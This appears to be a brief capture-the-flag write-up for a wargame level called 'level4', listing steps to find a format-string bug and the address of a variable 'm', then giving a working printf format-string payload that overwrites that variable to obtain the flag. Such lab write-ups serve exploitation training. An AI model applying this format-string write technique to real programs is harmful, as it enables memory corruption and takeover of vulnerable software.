- executable mimick stdin
- we see fgets, not exploitable?
- we see printf, maybe same exploit as before
- we find the addrss of "m" (0x08049810)
- we try and print %x with no arguments
- we our input variates the 12th adress from the beginning
- we craft a payload similar to levle3
- looking like: address of m + 16millions (the int in cmp) spaces + the n formatting with the 12 bytes padding that we found before
- get the flag

Payload:
```
python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n")' | ./level4
```

Extra context:
https://chat.openai.com/share/672132c7-1d64-474e-af58-614fa751df16

Dogbolt for source:
https://dogbolt.org/?id=b9f0625b-1ccf-4c04-ba81-40bf2a6eb0c0
